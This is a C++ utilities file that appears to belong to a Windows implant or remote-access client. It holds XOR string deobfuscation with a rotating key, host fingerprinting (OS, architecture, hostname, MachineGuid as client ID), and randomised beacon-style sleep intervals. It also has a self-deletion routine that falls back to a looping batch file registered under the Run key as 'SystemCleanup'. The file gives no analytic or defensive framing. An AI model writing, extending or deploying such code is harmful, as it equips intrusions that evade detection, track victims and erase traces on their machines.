#include "utils.h"
#include "config.hpp"
#include "globals.h"
#include <windows.h>
#include <string>
#include <sstream>
#include <random>
#include <chrono>
#include <iostream> // Added for std::cout

using namespace std;

// Updated deobfuscation function with key rotation
string deobfuscate(const unsigned char* obfuscated_str) {
    string result;
    char key = 0x42; // Initial key for XOR decoding - must match encoding
    
    for (int i = 0; obfuscated_str[i] != 0; i++) {
        result += (obfuscated_str[i] ^ key);
        key = (key >> 1) | ((key & 1) << 7); // Rotate key
    }
    
    return result;
}

// Move get_system_info from main.cpp
string get_system_info() {
    stringstream info;
    
    OSVERSIONINFO osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    if (GetVersionEx(&osvi)) {
        info << "OS:" << osvi.dwMajorVersion << "." << osvi.dwMinorVersion;
    }
    
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    info << ";ARCH:";
    switch(si.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64:
            info << "x64";
            break;
        case PROCESSOR_ARCHITECTURE_INTEL:
            info << "x86";
            break;
        default:
            info << "unknown";
    }
    
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    if (GetComputerNameA(computerName, &size)) {
        info << ";HOST:" << computerName;
    }
    
    return info.str();
}

// Move get_random_sleep_interval from main.cpp
int get_random_sleep_interval(int base_seconds) {
    // Use external rng defined in globals
    extern std::mt19937 rng;
    std::uniform_int_distribution<int> dist(base_seconds * 500, base_seconds * 1500); // 50%-150% of base
    return dist(rng);
}

string generate_client_id() {
    // Generate client ID
    string client_id;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                        "SOFTWARE\\Microsoft\\Cryptography", 
                        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char guid[256] = {0};
        DWORD guidSize = sizeof(guid);
        DWORD type;
        
        if (RegQueryValueExA(hKey, "MachineGuid", NULL, &type, 
                            (BYTE*)guid, &guidSize) == ERROR_SUCCESS) {
            client_id = string(guid);
        } else {
            client_id = "unknown";
        }
        RegCloseKey(hKey);
    } else {
        client_id = "unknown";
    }
    
    // if machine specs are not available, generate a unique ID (based on tick count)
    if (client_id == "unknown") {
        stringstream ss;
        ss << "client_" << GetTickCount();
        client_id = ss.str();
    }

    return client_id;
}

// Renamed function to avoid conflicts with any potential old definition
void safely_remove_original_executable(const string& path) {
    if (g_debug_mode) {
        cout << "Attempting to delete: " << path << endl;
        cout.flush();
    }
    
    // First ensure the file is not set to read-only
    SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_NORMAL);
    
    // Attempt to delete directly
    if (DeleteFileA(path.c_str())) {
        if (g_debug_mode) {
            cout << "File deleted successfully via DeleteFileA" << endl;
            cout.flush();
        }
        return;
    }
    
    DWORD error = GetLastError();
    if (g_debug_mode) {
        cout << "DeleteFileA failed with error: " << error << endl;
        cout.flush();
    }
    
    // If direct deletion fails, try using a batch file to delete on reboot
    if (error == ERROR_ACCESS_DENIED || error == ERROR_SHARING_VIOLATION) {
        if (g_debug_mode) {
            cout << "File in use, attempting alternative deletion methods..." << endl;
            cout.flush();
        }
        
        // Try MoveFileEx to delete on reboot
        if (MoveFileExA(path.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT)) {
            if (g_debug_mode) {
                cout << "File scheduled for deletion on reboot" << endl;
                cout.flush();
            }
            return;
        }
        
        error = GetLastError();
        if (g_debug_mode) {
            cout << "MoveFileExA failed with error: " << error << endl;
            cout.flush();
        }
        
        // Last resort: create a batch file to delete this executable on next reboot
        string tempPath;
        char tempPathBuffer[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPathBuffer);
        tempPath = string(tempPathBuffer) + "cleanup.bat";
        
        string batchContent = "@echo off\n"
                             ":loop\n"
                             "del \"" + path + "\"\n"
                             "if exist \"" + path + "\" goto loop\n"
                             "del \"%~f0\"\n";
        
        HANDLE hFile = CreateFileA(tempPath.c_str(), GENERIC_WRITE, 0, NULL, 
                                  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD bytesWritten;
            WriteFile(hFile, batchContent.c_str(), batchContent.length(), &bytesWritten, NULL);
            CloseHandle(hFile);
            
            // Create registry entry to run batch on startup
            HKEY hKey;
            if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
                RegSetValueExA(hKey, "SystemCleanup", 0, REG_SZ, 
                              (BYTE*)tempPath.c_str(), tempPath.length() + 1);
                RegCloseKey(hKey);
                
                if (g_debug_mode) {
                    cout << "Created cleanup batch file: " << tempPath << endl;
                    cout.flush();
                }
            }
        }
    }
}

// For backward compatibility, redirect old function to new one
void delete_original_file(const string& path) {
    safely_remove_original_executable(path);
}



